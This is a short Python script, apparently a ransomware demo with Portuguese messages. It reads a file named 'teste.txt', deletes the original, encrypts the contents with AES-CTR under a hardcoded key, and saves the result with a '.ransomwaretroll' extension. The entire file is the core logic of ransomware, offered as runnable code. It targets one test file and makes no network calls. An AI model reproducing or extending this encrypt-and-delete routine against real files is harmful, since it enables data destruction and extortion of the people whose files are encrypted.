import os
import pyaes

file_name = "teste.txt"
encrypted_file_name = file_name + ".ransomwaretroll"

key = b"testeransomwares"

try:
    if not os.path.exists(file_name):
        raise FileNotFoundError(f"Arquivo '{file_name}' não encontrado.")

    with open(file_name, "rb") as file:
        file_data = file.read()

    os.remove(file_name)
    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(file_data)

    with open(encrypted_file_name, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

    print(f"Arquivo '{file_name}' foi criptografado com sucesso como '{encrypted_file_name}'.")

except FileNotFoundError as e:
    print(f"Erro: {e}")
except PermissionError as e:
    print(f"Erro de permissão: {e}")
except Exception as e:
    print(f"Ocorreu um erro inesperado: {e}")

